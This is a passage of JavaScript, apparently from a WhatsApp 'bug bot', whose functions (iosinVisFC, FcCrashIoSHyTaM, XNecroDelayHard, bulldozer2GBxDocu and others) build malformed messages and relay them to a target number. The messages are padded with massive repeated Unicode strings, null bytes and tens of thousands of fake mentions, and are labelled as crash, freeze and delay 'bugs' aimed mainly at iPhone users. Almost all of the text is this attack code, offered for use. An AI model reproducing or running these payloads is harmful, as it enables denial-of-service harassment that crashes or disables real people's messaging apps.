                fileSha256: Buffer.from("ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=", "base64"),
                fileLength: "974197419741",
                pageCount: "974197419741",
                mediaKey: Buffer.from("5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=", "base64"),
                fileName: "𝄽̸̷̷̸̛̽͢͟͠͞͡͏́͢͟͡".repeat(70),
                fileEncSha256: Buffer.from("pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=", "base64"),
                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173"
              }
            }
          }
        },
        {}
      );
      await skid.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
    } catch (err) {
      console.log("Error Sending Bug:", err);
    }
    console.log("Succesfuly Sending Bug");
  }
}    
async function ProtoXAudio(skid, target, mention) {
    console.log("Attack DelayProto Berjalann...")
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from([
            226, 213, 217, 102, 205, 126, 232, 145,
            0,  70, 137,  73, 190, 145,   0,  44,
            165, 102, 153, 233, 111, 114,  69,  10,
            55,  61, 186, 131, 245, 153,  93, 211
        ]),
        fileLength: 432722,
                    seconds: 26,
                    ptt: false,
                    mediaKey: Buffer.from([
            182, 141, 235, 167, 91, 254,  75, 254,
            190, 229,  25,  16, 78,  48,  98, 117,
            42,  71,  65, 199, 10, 164,  16,  57,
            189, 229,  54,  93, 69,   6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
            29,  27, 247, 158, 114,  50, 140,  73,
            40, 108,  77, 206,   2,  12,  84, 131,
            54,  42,  63,  11,  46, 208, 136, 131,
            224,  87,  18, 220, 254, 211,  83, 153
        ]),
                    directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1746275400,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await skid.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await skid.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Bokep Njay" },
                        content: undefined
                    }
                ]
            }
        );
    }
} 
//============== IPHONE ===========//
async function iosinVisFC(skid, target, mention) {
console.log(chalk.red(`Succes Sending to ${target}`))
const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(6000); // Trigger1
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝑆𝑎𝑡𝑢𝑟𝑛𝑋" + TravaIphone, //Trigger 5
            matchedText: "𝑆𝑎𝑡𝑢𝑟𝑛𝑋",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
            title: "𝖭𝗈𝖡𝗈𝗄𝖾𝗉𝖲𝖺𝗍𝗎𝗋𝗇" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
            previewType: "NONE",
            jpegThumbnail: "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",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      let msg3 = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      await skid.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await skid.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await skid.relayMessage('status@broadcast', msg3.message, {
         messageId: msg2.key.id,
         statusJidList: [target],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: target
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};
async function ShredderIosSql(skid, target) {
  let msg1 = {
    paymentInviteMessage: {
      serviceType: "UPI",
      expiryTimestamp: Date.now() + 86400000,
      currencyCodeIso4217: "USD",
      amount: "999",
      requestFrom: target,
      noteMessage: {
      text: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      }
    },
    extendedTextMessage: {
      text: "SaturnXTeam" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      contextInfo: {
        stanzaId: target,
        participant: target,
        quotedMessage: {
          conversation: "Hi"
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING",
        },
      },
      inviteLinkGroupTypeV2: "DEFAULT",
    },
  };
  
  await skid.relayMessage(target, MSG, {
  messageId: null,
  participant: { jid: target } // pastikan ini sesuai dengan struktur yang diminta oleh library
});
  
  let msg2 = {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "SaturnXTeam" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      url: `https://t.me/Kyxsancs${"𑇂𑆵𑆴𑆿𑇂𑆵𑆴𑆿".repeat(25000)}`,
      contextInfo: {
      externalAdReply: {
        quotedAd: {
          advertiserName: "𑇂𑆵𑆴𑆿𑇂𑆵𑆴𑆿".repeat(600),
          mediaType: "IMAGE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
          caption: "𝙎𝘼𝙏𝙐𝙍𝙉𝙭𝙏𝙀𝘼𝙈" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
        },
      },
    },
  };
  
  await skid.relayMessage(target, msg2, {
    messageId: "",
    participant: { jid: target },
    userJid: target,
  });
  console.log(chalk.red(`─────「 ⏤CrashIosSql To: ${target}⏤ 」─────`));
}
async function FcCrashIoSHyTaM(skid, target) {
  const crashText = "‌⃰Ꮡ══╬╬══► 𝗦𝗔𝗧𝗨𝗥𝗡-𝗖𝗿𝗮𝘀𝗵𝗬𝗼𝘂`¿ ◄══╬╬══‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);

  await skid.relayMessage(
    target,
    {
    extendedTextMessage: {
            text: "ោ៝".repeat(60000) + crashText.repeat(5000),
            matchedText: "ោ៝".repeat(15000),
            url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
            title: "F",
            description: "ោ៝".repeat(10000), 
            previewType: 0,
            contextInfo: {
          participant: target,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from(
              { length: 1900 },
              () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
            ), 
          ],
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 18144000
            },
          },
        },
      },
    }, { participant: { jid: target }, });
  }
async function RansCrashIos(skid, target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await skid.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "👀𝚂𝙰𝚃𝚄𝚁𝙽 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻" + IphoneCrash,
                                           url: "https://youtube.com/@KyxsanGaming"
                                   }
                           }, {
			                  participant: {
						      jid: target
		              		  }
                           });
                           console.log("Send Bug By Saturn light");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
}

async function nolosios(skid, target) {
skid.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "👀༑𝚂𝙰𝚃𝚄𝚁𝙽 𝙾𝙵𝙵𝙸𝙲𝙸𝙰𝙻ཀ͜͡" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
participant: {
jid: target
}
}, 
{
  messageId: null,
}
);
}   
  
async function IosInvisibleForce(skid, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "SaturnXmangSape?\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/Kyxsancs",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "@SaturnXapps" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`))
}
async function XNecroCrashIosV3(skid, target) {
  for (let i = 0; i < 5; i++) {
    await skid.relayMessage(target, {
      extendedTextMessage: {
      text: "𝐊𝐲𝐱𝐳𝐚𝐧𝐗𝐬𝐚𝐭𝐮𝐫𝐧𝐗𝐭𝐞𝐚𝐦៚" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      contextInfo: {
        stanzaId: target,
        participant: target,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
            "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [
              {
                jid: "6285769675679@s.whatsapp.net",
                callOutcome: "1",
              },
            ],
          },
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1844000
          },
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING",
        },
        quotedAd: {
          advertiserName: "Example Adver",
          mediaType: "IMAGE",
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
          caption: "𑇂𑆵𑆴𑆿".repeat(5000),
        },
        placeholderKey: {
          remoteJid: "0s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        },
      },
      inviteLinkGroupTypeV2: "DEFAULT",
    },
  }, { participant: { jid: target } });
  console.log(chalk.red(`─────「 ⏤CrashIosV3⏤ 」─────`));
  }
}
async function VampireBlankIphone(skid, target) {
  try {
    const messsage = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "🚀SaturnXteam🔥" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };
    await skid.relayMessage(target, messsage, {
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
 console.log(chalk.green("# CRASH 1MSG SEND馃幁"));  
}    
async function IosPayX(sock, target, ptcp = false) {
  try {
    const msg = {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 86400000,
        currencyCodeIso4217: "USD",
        amount: "999",
        requestFrom: target,
        noteMessage: {
          text: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000)
        }
      },
      contextInfo: {
        participant: ptcp ? target : "0@s.whatsapp.net",
        quotedMessage: {
          conversation: "𑇂𑆵𑆴𑆿".repeat(25000)
        },
        forwardingScore: 1,
        isForwarded: false
      }
    };

    await skid.relayMessage(target, msg, {
      messageId: skid.generateMessageTag(),
      participant: { jid: target },
      messageTimestamp: Date.now()
    });
  } catch (err) {}
}
//============== DELAY ===========//
async function XNecroDelayHard(skid, target, mention) {
  for (let i = 0; i < 10; i++) {
    let etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𝐒𝐚𝐭𝐫𝐮𝐧𝐗𝐭𝐞𝐚𝐦៚", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          stanzaId: target,
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   }),
   { 
     ephemeralExpiration: 0,
     forwardingScore: 9741,
     isForwarded: true,
     font: Math.floor(Math.random() * 99999999),
     background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"), 
   });

  await skid.relayMessage("status@broadcast", etc.message, {
    messageId: etc.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await skid.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
  console.log(chalk.red(`Succes Sending Bug DelayHard To:`, target));
  await sleep(250);
  }
}
async function bulldozer2GBxDocu(skid, target) {
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

        let doc = {
      viewOnceMessage: {
        message: {
            interactiveMessage: {
             header: {
              documentMessage: {
               url: `https://mmg.whatsapp.net/v/t62.7119-24/${key}?ccb=11-4&oh=${Buffer}=66E74944&_nc_sid=${SID}&mms3=true`,
               mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
               fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
             fileLength: {
             low: Math.floor(Math.random() * 1000),
             high: 0,
             unsigned: true,
              },
               pageCount: 0x9184e729fff,
               mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
               fileName: "NtahMengapa..",
               fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
               directPath: `/v/t62.7119-24/${key}?ccb=11-4&oh=${Buffer}=66E74944&_nc_sid=5e03e0`, 
              mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
                contactVcard: true
                        },///
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ᬼ".repeat(61111)
                    },
                    nativeFlowMessage: {
                      messageParamsJson: "ᬼ".repeat(77777)
                    },
                    contextInfo: {
                        participan: target, 
                        mentionedJid:  Array.from({ length: 35000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`),
                        groupMentions: [{ groupJid: "1@g.us", groupSubject: " ~ travasdex`executive ~ " }], 
                        groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
                       },
                    }
                }
            }
          }  
        };
          
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
            disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
            },
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, doc, {});

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function FreezePackk(skid, target) {
    await skid.relayMessage(target, {
      stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "FvnkySaturn" + "ꦾ".repeat(70000),
      publisher: " Mp4" + "",
      stickers: [
        {
          fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
          isAnimated: false,
          emojis: [""],
          accessibilityLabel: "",
          isLottie: false,
          mimetype: "image/webp"
        },
        {
          fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
          isAnimated: false,
          emojis: [""],
